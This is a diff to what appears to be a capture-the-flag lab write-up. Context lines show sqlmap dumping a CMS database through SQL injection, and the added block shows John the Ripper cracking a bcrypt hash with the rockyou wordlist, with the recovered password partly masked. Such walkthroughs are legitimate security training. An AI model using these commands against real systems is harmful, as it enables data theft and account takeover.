@@ -94,7 +94,20 @@ available databases [6]:
 root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
 ```
 ![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)
-
+```bash
+root@ip-10-10-70-200:~# john promotheus.hash -w=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
+Use the "--format=bcrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s[.........]e       (?)
+1g 0:00:06:29 DONE (2023-03-09 09:30) 0.002569g/s 10.31p/s 10.31c/s 10.31C/s 19861986..543210
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
 
 ![image](https://user-images.githubusercontent.com/90036439/223977977-be6d630d-dd90-4e56-80cf-56c1de2884c3.png)
 
